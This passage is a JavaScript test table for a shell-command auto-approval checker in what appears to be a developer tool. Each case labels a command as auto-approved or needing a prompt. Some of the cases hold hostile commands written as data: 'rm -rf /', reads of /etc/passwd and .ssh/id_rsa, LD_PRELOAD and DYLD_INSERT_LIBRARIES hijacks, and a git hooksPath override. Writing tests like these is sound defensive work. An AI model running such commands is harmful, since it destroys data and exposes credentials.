  { name: 'big developer compound: cd && make && for-loop go test auto-approves with make */go * patterns',
    command: `cd ~/code/juggler && make go-build 2>&1 | tail -2 && for i in 1 2 3 4 5; do echo "=== $i ==="; JUGGLER_TEST_LOGS=1 go test -count=1 -run 'TestBrowser/integration:duplicate-conversation' ./tests/integration 2>&1 | tail -4; done`,
    patterns: ['make *', 'go *'], platform: 'darwin', expected: true },

  // === $VAR / ${VAR} expansions inside double quotes ===
  { name: 'echo "$VAR" auto-approves (expansion is opaque-text-only)',
    command: 'echo "$VAR"', patterns: [], platform: 'darwin', expected: true },
  { name: 'echo "${VAR}" with braces auto-approves',
    command: 'echo "${VAR}"', patterns: [], platform: 'darwin', expected: true },
  { name: 'echo "${PIPESTATUS[0]}" array subscript auto-approves (pure value read)',
    command: 'echo "${PIPESTATUS[0]}"', patterns: [], platform: 'darwin', expected: true },
  { name: 'echo "${arr[@]}" whole-array subscript auto-approves',
    command: 'echo "${arr[@]}"', patterns: [], platform: 'darwin', expected: true },
  { name: 'echo "${arr[i]}" identifier-index subscript auto-approves',
    command: 'echo "${arr[i]}"', patterns: [], platform: 'darwin', expected: true },
  { name: 'command substitution inside array subscript "${a[$(whoami)]}" still prompts',
    command: 'echo "${a[$(whoami)]}"', patterns: [], platform: 'darwin', expected: false },
  { name: 'command substitution "$(rm -rf /)" inside double quotes still prompts',
    command: 'echo "$(rm -rf /)"', patterns: [], platform: 'darwin', expected: false },
  { name: 'backtick command substitution "`whoami`" still prompts',
    command: 'echo "`whoami`"', patterns: [], platform: 'darwin', expected: false },

  // === `cd <in-project>` as a non-leading segment ===
  { name: 'cd to project as a NON-leading segment (after echo &&) auto-approves',
    command: 'echo alive && cd ~/code/juggler && tail -12 web/js-tests/integration-tests/read-file-tests.js',
    patterns: [], platform: 'darwin', expected: true },
  { name: 'mid-sequence cd into in-project subdir then ls auto-approves',
    command: 'echo hi; cd web/js && ls', patterns: [], platform: 'darwin', expected: true },
  { name: 'cd to a path outside allowed roots prompts',
    command: 'echo hi && cd /etc && cat passwd', patterns: [], platform: 'darwin', expected: false },
  { name: 'bare cd (→ $HOME) prompts',
    command: 'echo hi && cd && cat .ssh/id_rsa', patterns: [], platform: 'darwin', expected: false },
  { name: 'cd - (→ $OLDPWD) prompts',
    command: 'echo hi && cd - && ls', patterns: [], platform: 'darwin', expected: false },
  // Leading `cd -` too: $OLDPWD is unknowable here, and it is emphatically not
  // the relative directory `./-` that the containment check would take it for.
  { name: 'leading cd - (→ $OLDPWD) prompts',
    command: 'cd - && ls', patterns: [], platform: 'darwin', expected: false },
  { name: 'leading cd - is not rescued by a cd wildcard',
    command: 'cd -; ls', patterns: ['cd *', 'ls *'], platform: 'darwin', expected: false },
  { name: 'cd into project then absolute out-of-project read still prompts',
    command: 'cd ~/code/juggler && cat /etc/passwd', patterns: [], platform: 'darwin', expected: false },
  { name: 'cd into subdir then a .. escape still prompts',
    command: 'cd web && cat ../../etc/passwd', patterns: [], platform: 'darwin', expected: false },

  // === leading `cd <in-project>` with `;` / newline separators (not just `&&`) ===
  // Regression: a leading `cd <in-project>` must be judged the same whether the
  // following separator is `&&`, `;`, or a newline. The identical `cd` already
  // validates as a non-leading segment (section above), so `;`/newline must not
  // hard-reject it while `&&` is accepted.
  { name: 'leading cd into project + `;` + make matches make *',
    command: 'cd ~/code/juggler; make build', patterns: ['make *'], platform: 'darwin', expected: true },
  { name: 'leading cd into project + newline + make matches make *',
    command: 'cd ~/code/juggler\nmake build', patterns: ['make *'], platform: 'darwin', expected: true },
  { name: 'leading cd into project + `;` + trivially-safe builtin auto-approves',
    command: 'cd ~/code/juggler; ls web/js', patterns: [], platform: 'darwin', expected: true },
  { name: 'multi-line leading cd then `;`-joined lint pipeline with PIPESTATUS echo auto-approves',
    command: `cd ~/code/juggler
echo "== js =="; make lint-js 2>&1 | tail -12; echo "js_rc=\${PIPESTATUS[0]}"`,
    patterns: ['make *'], platform: 'darwin', expected: true },
  // Guards: the relaxation must not approve an out-of-root or unsafe leading-cd chain.
  { name: 'leading cd OUTSIDE project + `;` + make still prompts',
    command: 'cd /tmp; make build', patterns: ['make *'], platform: 'darwin', expected: false },
  { name: 'leading cd into project + `;` + rm still prompts',
    command: 'cd ~/code/juggler; rm -rf /', patterns: [], platform: 'darwin', expected: false },
  { name: 'bare leading cd (→ $HOME) + `;` still prompts',
    command: 'cd; ls', patterns: [], platform: 'darwin', expected: false },

  // === literal `$` inside double quotes (regex anchors, not expansions) ===
  { name: 'grep with $ regex end-anchor before | inside double quotes auto-approves',
    command: 'grep -nE "^ok|^FAIL|FAIL$|--- FAIL" README.md', patterns: [], platform: 'darwin', expected: true },
  { name: 'echo of a literal trailing $ auto-approves',
    command: 'echo "price: 5$"', patterns: [], platform: 'darwin', expected: true },
  { name: 'grep $-anchor + $VAR expansion in one pattern auto-approves',
    command: 'grep -nE "done$|^${PREFIX}" README.md', patterns: [], platform: 'darwin', expected: true },
  { name: 'literal $ does not unlock command substitution "$(id)" — still prompts',
    command: 'echo "x$(id)"', patterns: [], platform: 'darwin', expected: false },
  { name: 'maketest log grep|tail compound with FAIL$ anchor auto-approves with /tmp root',
    command: 'cd ~/code/juggler && grep -nE "^ok|^FAIL|FAIL$|--- FAIL" /tmp/maketest3.log | tail; echo "=== x ==="; grep "unit:bash-command-approval" /tmp/maketest3.log | tail -2',
    patterns: [], allowedRoots: [PROJECT_ROOT, '/tmp'], platform: 'darwin', expected: true },

  // === $((...)) arithmetic expansion inside double quotes ===
  { name: 'echo "$((1+2))" arithmetic expansion auto-approves (numeric result)',
    command: 'echo "$((1+2))"', patterns: [], platform: 'darwin', expected: true },
  { name: 'echo "$((ln+12))" arithmetic with variable auto-approves',
    command: 'echo "$((ln+12))"', patterns: [], platform: 'darwin', expected: true },
  { name: 'echo "$(( (a+b)*c ))" arithmetic with nested parens auto-approves',
    command: 'echo "$(( (a+b)*c ))"', patterns: [], platform: 'darwin', expected: true },
  { name: 'command substitution inside arithmetic "$(( $(id) ))" still prompts',
    command: 'echo "$(( $(id) ))"', patterns: [], platform: 'darwin', expected: false },
  { name: 'for-loop with sed range using $((...)) arithmetic auto-approves',
    command: 'cd ~/code/juggler && for ln in 405 530 616 700; do echo "=== around $ln ==="; sed -n "${ln},$((ln+12))p" cmd/juggler/ops/shell_ops.go; done',
    patterns: [], platform: 'darwin', expected: true },
  { name: 'sed range script with ${VAR} and $((...)) over in-project file auto-approves',
    command: 'sed -n "${ln},$((ln+12))p" web/css/components.css', patterns: [], platform: 'darwin', expected: true },

  // === subshell `( … )` and brace `{ …; }` grouping ===
  { name: 'subshell group with a safe body auto-approves (group = its interior)',
    command: '(echo hi)', patterns: [], platform: 'darwin', expected: true },
  { name: 'subshell group with multiple safe commands auto-approves',
    command: '(echo hi; pwd)', patterns: [], platform: 'darwin', expected: true },
  { name: 'brace group with multiple safe commands auto-approves',
    command: '{ echo hi; pwd; }', patterns: [], platform: 'darwin', expected: true },
  { name: 'subshell with an unsafe command in the body prompts',
    command: '(echo hi; rm -rf /)', patterns: [], platform: 'darwin', expected: false },
  { name: 'bare subshell of an unsafe command prompts',
    command: '(rm -rf /)', patterns: [], platform: 'darwin', expected: false },
  { name: 'unbalanced subshell (no closing paren) prompts',
    command: '(echo hi', patterns: [], platform: 'darwin', expected: false },
  { name: 'mismatched group delimiters ( … } prompts',
    command: '(echo hi}', patterns: [], platform: 'darwin', expected: false },
  // The real-world build command: make>/tmp redirect stripped (write on, /tmp
  // in roots), echo safe, and the `|| ( … )` failure-branch subshell of
  // echo + tail-of-/tmp-file all reduce to safe. With make * enabled → approve.
  { name: 'build && echo OK || (echo FAIL; tail /tmp/log) auto-approves with /tmp+write+make*',
    command: 'cd ~/code/juggler && make go-build >/tmp/gobuild.log 2>&1 && echo "BUILD OK" || (echo "BUILD FAIL"; tail -20 /tmp/gobuild.log)',
    patterns: ['make *'], allowedRoots: [PROJECT_ROOT, '/tmp'], writeEnabled: true, platform: 'darwin', expected: true },
  { name: 'same build with brace-group failure branch auto-approves',
    command: 'cd ~/code/juggler && make go-build >/tmp/gobuild.log 2>&1 && echo "BUILD OK" || { echo "BUILD FAIL"; tail -20 /tmp/gobuild.log; }',
    patterns: ['make *'], allowedRoots: [PROJECT_ROOT, '/tmp'], writeEnabled: true, platform: 'darwin', expected: true },
  { name: 'same build with a different /tmp logfile name auto-approves',
    command: 'cd ~/code/juggler && make go-build >/tmp/gb.log 2>&1 && echo "BUILD OK" || { echo "BUILD FAIL"; tail -20 /tmp/gb.log; }',
    patterns: ['make *'], allowedRoots: [PROJECT_ROOT, '/tmp'], writeEnabled: true, platform: 'darwin', expected: true },
  { name: 'build group WITHOUT /tmp in roots prompts (redirect + tail not strippable)',
    command: 'cd ~/code/juggler && make go-build >/tmp/gb.log 2>&1 && echo "BUILD OK" || { echo "BUILD FAIL"; tail -20 /tmp/gb.log; }',
    patterns: ['make *'], platform: 'darwin', expected: false },
  { name: 'find with backslash-escaped grouping parens auto-approves',
    command: 'find . \\( -name "*.js" -o -name "*.css" \\) -type f', patterns: [], platform: 'darwin', expected: true },

  // === env-var prefix ===
  { name: 'FOO=bar prefix on safe command auto-approves',
    command: 'FOO=bar echo hi', patterns: [], platform: 'darwin', expected: true },
  { name: 'LD_PRELOAD prefix prompts (loader hijack)',
    command: 'LD_PRELOAD=/tmp/evil.so ls', patterns: ['ls *'], platform: 'darwin', expected: false },
  { name: 'PATH= prefix prompts (command-resolution hijack)',
    command: 'PATH=/tmp ls', patterns: ['ls *'], platform: 'darwin', expected: false },
  { name: 'DYLD_INSERT_LIBRARIES prefix prompts',
    command: 'DYLD_INSERT_LIBRARIES=/tmp/x.dylib ls', patterns: ['ls *'], platform: 'darwin', expected: false },

  { name: 'sed -n with `:` typo in address (harmless malformed script) auto-approves',
    command: "cd ~/code/juggler && sed -n '7:18p' cmd/juggler/worker/worker.go; sed -n '7,18p' cmd/juggler/worker/worker.go", patterns: [], platform: 'darwin', expected: true },
  { name: 'sed regex-range address //,// is safe',
    command: "sed -n '/start/,/end/p' web/css/components.css", patterns: [], platform: 'darwin', expected: true },
  { name: 'sed -e `r FILE` (read-file command) prompts',
    command: "sed -e 'r /etc/passwd' web/css/components.css", patterns: [], platform: 'darwin', expected: false },
  { name: 'sed -n with ~/project-inside path is safe',
    command: "sed -n '748,758p' ~/code/juggler/web/extensions/juggler-core/context-items/execute/command-approval.js", patterns: [], platform: 'darwin', expected: true },
  { name: 'sed with ~/<other-project> outside allowed roots prompts',
    command: "sed -n '1,5p' ~/code/other-project/file.js", patterns: [], platform: 'darwin', expected: false },
  // Regression: the previous lexical "longest tail of root equals head of
  // suffix" rule mis-approved this — root tail [secret] matched suffix head
  // [secret] for root /Users/jules/code/juggler/secret. ~ expands to $HOME =
  // /Users/jules, so the real path is /Users/jules/secret/etc/passwd which is
  // NOT inside that root. With `home` plumbed in we resolve before matching.
  { name: 'sed with ~/secret/... must NOT match a root ending in /secret',
    command: "sed -n '1,5p' ~/secret/etc/passwd", patterns: [], platform: 'darwin',
    allowedRoots: ['/Users/jules/code/juggler/secret'], expected: false },
  // Allowed roots are stored verbatim as the user types them, so a root may be
  // in `~`-form. Matching must canonicalise BOTH the command's path and each
  // stored root before comparing — otherwise a `~`-form root never matches an
  // absolute (or `~`-form) path inside it, and the suggester offers to add a
  // folder that is already permitted.
  { name: 'absolute path inside a ~-form allowed root auto-approves',
    command: 'ls /Users/jules/Library/Logs/Juggler', patterns: [], platform: 'darwin',
    allowedRoots: ['~/Library/Logs/Juggler'], expected: true },
  { name: 'tilde path inside a ~-form allowed root auto-approves',
    command: 'cat ~/Library/Logs/Juggler/host.log', patterns: [], platform: 'darwin',
    allowedRoots: ['~/Library/Logs/Juggler'], expected: true },
  { name: 'tilde path inside an absolute allowed root auto-approves',
    command: 'cat ~/Library/Logs/Juggler/host.log', patterns: [], platform: 'darwin',
    allowedRoots: ['/Users/jules/Library/Logs/Juggler'], expected: true },
  { name: 'path outside a ~-form allowed root still prompts',
    command: 'cat ~/Library/Other/x.log', patterns: [], platform: 'darwin',
    allowedRoots: ['~/Library/Logs/Juggler'], expected: false },
  { name: 'trailing-slash ~-form root still matches a path inside it',
    command: 'cat /Users/jules/Library/Logs/Juggler/host.log', patterns: [], platform: 'darwin',
    allowedRoots: ['~/Library/Logs/Juggler/'], expected: true },
  { name: 'sed as a pipeline sink is safe',
    command: "awk '/foo/' web/css/components.css | sed -n '1,30p'", patterns: [], platform: 'darwin', expected: true },
  { name: 'sed as a sink rejects -i',
    command: "echo hi | sed -i 's/x/y/'", patterns: [], platform: 'darwin', expected: false },

  // === awk ===
  { name: 'awk range pattern over in-project file is safe',
    command: "awk '/^func PopStackItem/,/^}/' 3rdparty/y-crdt/undo_manager.go", patterns: [], platform: 'darwin', expected: true },
  { name: 'full compound awk|grep|head ; echo ; awk|sed is safe',
    command: "cd ~/code/juggler && awk '/^func PopStackItem/,/^}/' 3rdparty/y-crdt/undo_manager.go | grep -n 'Transact' | head; echo ---; awk '/PopStackItem/,/^}/' 3rdparty/y-crdt/undo_manager.go | sed -n '1,30p'",
    patterns: [], platform: 'darwin', expected: true },
  { name: 'awk -F separator + print is safe',
    command: "awk -F: '{print $1}' web/css/components.css", patterns: [], platform: 'darwin', expected: true },
  { name: 'awk -v name=val is safe',
    command: "awk -v name=val '{print name}' web/css/components.css", patterns: [], platform: 'darwin', expected: true },
  { name: 'awk with system() prompts',
    command: "awk 'BEGIN{system(\"rm -rf /\")}'", patterns: [], platform: 'darwin', expected: false },
  { name: 'awk with redirection prompts',
    command: "awk '{print > \"/tmp/x\"}' web/css/components.css", patterns: [], platform: 'darwin', expected: false },
  { name: 'awk with getline prompts',
    command: "awk 'getline x < \"/etc/passwd\"'", patterns: [], platform: 'darwin', expected: false },
  { name: 'awk -f scriptfile prompts',
    command: 'awk -f /tmp/script.awk web/css/components.css', patterns: [], platform: 'darwin', expected: false },
  { name: 'awk on out-of-project file prompts',
    command: "awk '/foo/' /etc/passwd", patterns: [], platform: 'darwin', expected: false },

  // === git ===
  { name: 'git diff --name-only of in-project file is safe',
    command: 'git diff --name-only web/css/components.css', patterns: [], platform: 'darwin', expected: true },
  { name: 'cd ~/project + git diff --name-only is safe',
    command: 'cd ~/code/juggler && git diff --name-only web/css/components.css', patterns: [], platform: 'darwin', expected: true },
  { name: 'git status -s is safe',
    command: 'git status -s', patterns: [], platform: 'darwin', expected: true },
  { name: 'git log --oneline -n 10 is safe',
    command: 'git log --oneline -n 10', patterns: [], platform: 'darwin', expected: true },
  { name: 'git log -S pickaxe (glued) | head is safe',
    command: 'cd ~/code/juggler && git log --oneline -S"isLoopbackAddr" --all | head -10', patterns: [], platform: 'darwin', expected: true },
  { name: 'git log -G pickaxe-regex (glued) is safe',
    command: 'git log -Gfoo --pickaxe-regex', patterns: [], platform: 'darwin', expected: true },
  { name: 'git show HEAD is safe',
    command: 'git show HEAD', patterns: [], platform: 'darwin', expected: true },
  { name: 'git diff between refs is safe',
    command: 'git diff main..HEAD', patterns: [], platform: 'darwin', expected: true },
  { name: 'git commit prompts (write subcommand)',
    command: 'git commit -m "x"', patterns: [], platform: 'darwin', expected: false },
  { name: 'git push prompts',
    command: 'git push origin main', patterns: [], platform: 'darwin', expected: false },
  { name: 'git reset --hard prompts',
    command: 'git reset --hard HEAD~1', patterns: [], platform: 'darwin', expected: false },
  { name: 'git checkout prompts (mutates working tree)',
    command: 'git checkout main', patterns: [], platform: 'darwin', expected: false },
  { name: 'git -c name=value prompts (could disable safety)',
    command: 'git -c core.hooksPath=/tmp/evil status', patterns: [], platform: 'darwin', expected: false },
  { name: 'git config --get is safe',
    command: 'git config --get user.email', patterns: [], platform: 'darwin', expected: true },
  { name: 'git config user.email value prompts (write form)',
    command: 'git config user.email me@x.com', patterns: [], platform: 'darwin', expected: false },

  // --- branch: safe list forms ---
  { name: 'git branch (list) is safe',
    command: 'git branch', patterns: [], expected: true },
  { name: 'git branch -a is safe',
    command: 'git branch -a', patterns: [], expected: true },
  { name: 'git branch -r is safe',
    command: 'git branch -r', patterns: [], expected: true },
  { name: 'git branch --show-current is safe',
    command: 'git branch --show-current', patterns: [], expected: true },
  { name: 'git branch --contains main is safe',
    command: 'git branch --contains main', patterns: [], expected: true },
  { name: 'git branch -a --merged origin/main is safe',
    command: 'git branch -a --merged origin/main', patterns: [], expected: true },
  { name: 'git branch -l feature/* is safe (list filter pattern)',
    command: 'git branch -l feature/*', patterns: [], expected: true },
  // --- branch: write forms blocked ---
  { name: 'git branch newbranch prompts (creates branch)',
    command: 'git branch newbranch', patterns: [], expected: false },
  { name: 'git branch -- main prompts (positionals after -- are write)',
    command: 'git branch -- main', patterns: [], expected: false },

  // --- tag: safe list forms ---
  { name: 'git tag (list) is safe',
    command: 'git tag', patterns: [], expected: true },
  { name: 'git tag -l is safe',
    command: 'git tag -l', patterns: [], expected: true },
  { name: "git tag -l 'v1.*' is safe",
    command: "git tag -l 'v1.*'", patterns: [], expected: true },
  { name: 'git tag --contains HEAD is safe',
    command: 'git tag --contains HEAD', patterns: [], expected: true },
  { name: 'git tag --sort=-version:refname is safe',
    command: 'git tag --sort=-version:refname', patterns: [], expected: true },
  // --- tag: write forms blocked ---
  { name: 'git tag v1.0.0 prompts (creates tag)',
    command: 'git tag v1.0.0', patterns: [], expected: false },
  { name: 'git tag -a v1.0.0 prompts (annotated tag, -a not in flag list)',
    command: 'git tag -a v1.0.0', patterns: [], expected: false },

  // --- reflog: safe show forms ---
  { name: 'git reflog is safe',
    command: 'git reflog', patterns: [], expected: true },
  { name: 'git reflog show is safe',
    command: 'git reflog show', patterns: [], expected: true },
  { name: 'git reflog show HEAD@{5} is safe (reflog selector ref)',
    command: 'git reflog show HEAD@{5}', patterns: [], expected: true },
  { name: 'git reflog --all is safe',
    command: 'git reflog --all', patterns: [], expected: true },
  // --- reflog: destructive forms blocked ---
  { name: 'git reflog expire --all prompts (destructive)',
    command: 'git reflog expire --all', patterns: [], expected: false },
  { name: 'git reflog delete refs/stash@{0} prompts (destructive)',
    command: 'git reflog delete refs/stash@{0}', patterns: [], expected: false },
  { name: 'git reflog drop stash@{0} prompts (destructive)',
    command: 'git reflog drop stash@{0}', patterns: [], expected: false },

  // --- stash: safe read forms ---
  { name: 'git stash list is safe',
    command: 'git stash list', patterns: [], expected: true },
  { name: 'git stash list --oneline is safe',
    command: 'git stash list --oneline', patterns: [], expected: true },
  { name: 'git stash show is safe',
    command: 'git stash show', patterns: [], expected: true },
  { name: 'git stash show -p is safe',
    command: 'git stash show -p', patterns: [], expected: true },
  { name: 'git stash show stash@{1} is safe (reflog-style ref)',
    command: 'git stash show stash@{1}', patterns: [], expected: true },
  { name: 'git stash show -p stash@{0} is safe',
    command: 'git stash show -p stash@{0}', patterns: [], expected: true },
  // --- stash: write forms blocked ---
  { name: 'git stash (bare) prompts — equivalent to push',
    command: 'git stash', patterns: [], expected: false },
  { name: 'git stash push prompts (creates stash)',
    command: 'git stash push', patterns: [], expected: false },
  { name: 'git stash pop prompts (modifies working tree)',
    command: 'git stash pop', patterns: [], expected: false },
  { name: 'git stash apply prompts (modifies working tree)',
    command: 'git stash apply', patterns: [], expected: false },
  { name: 'git stash drop stash@{0} prompts (deletes entry)',
    command: 'git stash drop stash@{0}', patterns: [], expected: false },
  { name: 'git stash clear prompts (deletes all entries)',
    command: 'git stash clear', patterns: [], expected: false },
  { name: 'git stash branch feat stash@{0} prompts (creates branch)',
    command: 'git stash branch feat stash@{0}', patterns: [], expected: false },

  // --- remote: safe query forms ---
  { name: 'git remote is safe (list)',
    command: 'git remote', patterns: [], expected: true },
  { name: 'git remote -v is safe',
    command: 'git remote -v', patterns: [], expected: true },
  { name: 'git remote show origin is safe',
    command: 'git remote show origin', patterns: [], expected: true },
  { name: 'git remote get-url origin is safe',
    command: 'git remote get-url origin', patterns: [], expected: true },
  // --- remote: write forms blocked ---
  { name: 'git remote add prompts (write op)',
    command: 'git remote add upstream https://github.com/foo/bar', patterns: [], expected: false },
  { name: 'git remote set-url prompts (write op)',
    command: 'git remote set-url origin https://github.com/foo/bar', patterns: [], expected: false },
  { name: 'git remote remove prompts (write op)',
    command: 'git remote remove origin', patterns: [], expected: false },

  // --- submodule: safe read forms ---
  { name: 'git submodule status is safe',
    command: 'git submodule status', patterns: [], expected: true },
  { name: 'git submodule status --recursive is safe',
    command: 'git submodule status --recursive', patterns: [], expected: true },
  { name: 'git submodule summary is safe',
    command: 'git submodule summary', patterns: [], expected: true },
  // --- submodule: write forms blocked ---
  { name: 'git submodule update prompts (modifies working tree)',
    command: 'git submodule update', patterns: [], expected: false },
  { name: 'git submodule init prompts (write op)',
    command: 'git submodule init', patterns: [], expected: false },
  { name: 'git submodule (bare) prompts',
    command: 'git submodule', patterns: [], expected: false },

  // --- worktree: safe read forms ---
  { name: 'git worktree list is safe',
    command: 'git worktree list', patterns: [], expected: true },
  { name: 'git worktree list --porcelain is safe',
    command: 'git worktree list --porcelain', patterns: [], expected: true },
  // --- worktree: write forms blocked ---
  { name: 'git worktree add prompts (creates worktree)',
    command: 'git worktree add ../branch feature', patterns: [], expected: false },
  { name: 'git worktree (bare) prompts',
    command: 'git worktree', patterns: [], expected: false },

  // --- symbolic-ref: safe single-positional read form ---
  { name: 'git symbolic-ref HEAD is safe',
    command: 'git symbolic-ref HEAD', patterns: [], expected: true },
  { name: 'git symbolic-ref --short HEAD is safe',
    command: 'git symbolic-ref --short HEAD', patterns: [], expected: true },
  // --- symbolic-ref: write forms blocked ---
  { name: 'git symbolic-ref HEAD refs/heads/main prompts (write form)',
    command: 'git symbolic-ref HEAD refs/heads/main', patterns: [], expected: false },
  { name: 'git symbolic-ref (bare) prompts',
    command: 'git symbolic-ref', patterns: [], expected: false },

  // --- for-each-ref ---
  { name: 'git for-each-ref is safe',
    command: 'git for-each-ref', patterns: [], expected: true },
  { name: "git for-each-ref --format='%(refname:short)' is safe",
    command: "git for-each-ref --format='%(refname:short)'", patterns: [], expected: true },
  { name: 'git for-each-ref --sort=-version:refname is safe',
    command: 'git for-each-ref --sort=-version:refname', patterns: [], expected: true },
  { name: 'git for-each-ref --count=10 is safe',
    command: 'git for-each-ref --count=10', patterns: [], expected: true },
  { name: 'git for-each-ref refs/heads/ is safe (in-project not required for refs)',
    command: 'git for-each-ref refs/heads/', patterns: [], expected: true },

  // --- rev-list ---
  { name: 'git rev-list HEAD is safe',
    command: 'git rev-list HEAD', patterns: [], expected: true },
  { name: 'git rev-list --count HEAD is safe',
    command: 'git rev-list --count HEAD', patterns: [], expected: true },
  { name: 'git rev-list --oneline main..HEAD is safe',
    command: 'git rev-list --oneline main..HEAD', patterns: [], expected: true },
  { name: 'git rev-list --max-count=10 --all is safe',
    command: 'git rev-list --max-count=10 --all', patterns: [], expected: true },

  // --- merge-base ---
  { name: 'git merge-base main HEAD is safe',
    command: 'git merge-base main HEAD', patterns: [], expected: true },
  { name: 'git merge-base --is-ancestor main HEAD is safe',
    command: 'git merge-base --is-ancestor main HEAD', patterns: [], expected: true },

  // --- check-ignore ---
  { name: 'git check-ignore -v web/build is safe',
    command: 'git check-ignore -v web/build', patterns: [], expected: true },
  { name: 'git check-ignore --stdin is safe',
    command: 'git check-ignore --stdin', patterns: [], expected: true },

  // --- count-objects ---
  { name: 'git count-objects is safe',
    command: 'git count-objects', patterns: [], expected: true },
  { name: 'git count-objects -v is safe',
    command: 'git count-objects -v', patterns: [], expected: true },
  { name: 'git count-objects --human-readable is safe',
    command: 'git count-objects --human-readable', patterns: [], expected: true },

  // --- reflog selector refs now match REF_RE ---
  { name: 'git show stash@{0} is safe (reflog-style ref)',
    command: 'git show stash@{0}', patterns: [], expected: true },
  { name: 'git diff HEAD@{1} HEAD is safe',
    command: 'git diff HEAD@{1} HEAD', patterns: [], expected: true },

  // --- new diff flags ---
  { name: 'git diff --diff-filter=M is safe',
    command: 'git diff --diff-filter=M', patterns: [], expected: true },
  { name: 'git diff --exit-code is safe',
    command: 'git diff --exit-code', patterns: [], expected: true },
  { name: 'git diff --quiet is safe',
    command: 'git diff --quiet', patterns: [], expected: true },
  { name: 'git diff -q is safe',
    command: 'git diff -q', patterns: [], expected: true },
  { name: 'git diff --text is safe',
    command: 'git diff --text', patterns: [], expected: true },
  { name: 'git diff -a is safe',
    command: 'git diff -a', patterns: [], expected: true },
  { name: 'git diff --ignore-submodules=all is safe',
    command: 'git diff --ignore-submodules=all', patterns: [], expected: true },

  // --- new log flags ---
  { name: 'git log --diff-filter=A is safe',
    command: 'git log --diff-filter=A', patterns: [], expected: true },
  { name: 'git log -i --grep=foo is safe',
    command: 'git log -i --grep=foo', patterns: [], expected: true },
  { name: 'git log --left-right main...HEAD is safe',
    command: 'git log --left-right main...HEAD', patterns: [], expected: true },
  { name: 'git log --cherry-pick main...feature is safe',
    command: 'git log --cherry-pick main...feature', patterns: [], expected: true },
  { name: 'git log --branches is safe',
    command: 'git log --branches', patterns: [], expected: true },
  { name: 'git log --tags=v1.* is safe',
    command: 'git log --tags=v1.*', patterns: [], expected: true },

  // --- new show flags ---
  { name: 'git show -p HEAD is safe',
    command: 'git show -p HEAD', patterns: [], expected: true },
  { name: 'git show --patch HEAD is safe',
    command: 'git show --patch HEAD', patterns: [], expected: true },
  { name: 'git show --no-patch HEAD is safe',
    command: 'git show --no-patch HEAD', patterns: [], expected: true },
  { name: 'git show --raw HEAD is safe',
    command: 'git show --raw HEAD', patterns: [], expected: true },
  { name: 'git show -w HEAD is safe',
    command: 'git show -w HEAD', patterns: [], expected: true },
  { name: 'git show -U5 HEAD is safe',
    command: 'git show -U5 HEAD', patterns: [], expected: true },

  // === xargs ===
  { name: 'find | xargs grep -l | head is safe',
    command: 'find tests/integration -name "*.go" | xargs grep -l "undo" | head', patterns: [], platform: 'darwin', expected: true },
  { name: 'compound: cd + find|xargs grep|head ; grep -rn|head',
    command: 'cd ~/code/juggler && find tests/integration -name "*.go" | xargs grep -l "undo\\|Undo" | head; grep -rn "pending\\|PENDING\\|reconcile\\|approval" tests/integration | head -30',
    patterns: [], platform: 'darwin', expected: true },
  { name: 'xargs with unsafe sub-command prompts',
    command: 'find . -name "*.tmp" | xargs rm', patterns: [], platform: 'darwin', expected: false },
  { name: 'xargs -a FILE (alt input source) prompts',
    command: 'xargs -a /etc/passwd grep root', patterns: [], platform: 'darwin', expected: false },
  { name: 'xargs grep -f /etc/patterns prompts (sub-handler rejects -f)',
    command: 'find . -name "*.go" | xargs grep -f /etc/patterns', patterns: [], platform: 'darwin', expected: false },

  // === inline /dev/null redirects ===
  { name: 'inline 2>/dev/null between args is safe',
    command: 'grep -l "x" web/js 2>/dev/null -r | head', patterns: [], platform: 'darwin', expected: true },
  { name: 'compound grep|head && echo && grep 2>/dev/null -r|head is safe',
    command: 'cd ~/code/juggler && grep -rln "MANIFEST\\s*=\\|MANIFEST:" web/js | head -10 && echo --- && grep -l "foo" web/js 2>/dev/null -r | head',
    patterns: [], platform: 'darwin', expected: true },
  { name: 'inline >/dev/null between args is safe',
    command: 'grep -l "x" web/js >/dev/null -r', patterns: [], platform: 'darwin', expected: true },
  { name: 'inline > /tmp/foo (non-null target) still prompts',
    command: 'grep -l "x" web/js > /tmp/foo -r', patterns: [], platform: 'darwin', expected: false },

  // === sleep ===
  { name: 'sleep <seconds> is safe',
    command: 'sleep 3', patterns: [], platform: 'darwin', expected: true },
  { name: 'sleep <fractional> is safe',
    command: 'sleep 1.5', patterns: [], platform: 'darwin', expected: true },
  { name: 'sleep with unit suffix (5m, 2h) is safe',
    command: 'sleep 5m', patterns: [], platform: 'darwin', expected: true },
  { name: 'cd + sleep + go test * with pattern is safe',
    command: "cd ~/code/juggler && sleep 3 && go test -v -count=1 -timeout 60s -run 'TestBrowser/integration:selection-auto-selects-next-pending-after-approve' ./tests/integration 2>&1 | tail -10",
    patterns: ['go test *'], platform: 'darwin', expected: true },
  { name: 'sleep with no arg prompts',
    command: 'sleep', patterns: [], platform: 'darwin', expected: false },
  { name: 'sleep with non-numeric arg prompts',
    command: 'sleep abc', patterns: [], platform: 'darwin', expected: false },

  // === write redirects gated on write-permission + allowed path ===
  // A `>`/`>>`/`2>` to a file is stripped (treated as a permitted output
  // destination) ONLY when write-file permission is enabled AND the target
  // resolves inside an allowed path — mirroring the write-file plugin, but
  // additionally path-scoped for defense in depth.
  { name: 'echo > out.log with write enabled (relative path) auto-approves',
    command: 'echo hi > out.log', writeEnabled: true, expected: true },
  { name: 'echo > out.log WITHOUT write enabled stays blocked',
    command: 'echo hi > out.log', writeEnabled: false, expected: false },
  { name: 'echo >> sub/dir/out.log append with write enabled auto-approves',
    command: 'echo hi >> sub/dir/out.log', writeEnabled: true, expected: true },
  { name: 'echo 2> err.log stderr redirect with write enabled auto-approves',
    command: 'echo hi 2> err.log', writeEnabled: true, expected: true },
  { name: 'redirect to absolute path inside roots with write enabled auto-approves',
    command: 'echo hi > ~/code/juggler/build.log', writeEnabled: true, expected: true },
  { name: 'redirect to /tmp outside roots stays blocked even with write enabled',
    command: 'echo hi > /tmp/out.log', writeEnabled: true, expected: false },
  { name: 'redirect to /tmp WHEN /tmp is an allowed root + write enabled auto-approves',
    command: 'echo hi > /tmp/out.log', writeEnabled: true, allowedRoots: ['/tmp'], expected: true },
  { name: 'redirect escaping roots via .. stays blocked even with write enabled',
    command: 'echo hi > ../../etc/out.log', writeEnabled: true, expected: false },
  { name: 'stripping redirect does NOT bypass command check: rm -rf / > out.log blocked',
    command: 'rm -rf / > out.log', writeEnabled: true, expected: false },
  { name: 'stripping redirect does NOT bypass read scoping: cat /etc/passwd > out.log blocked',
    command: 'cat /etc/passwd > out.log', writeEnabled: true, expected: false },
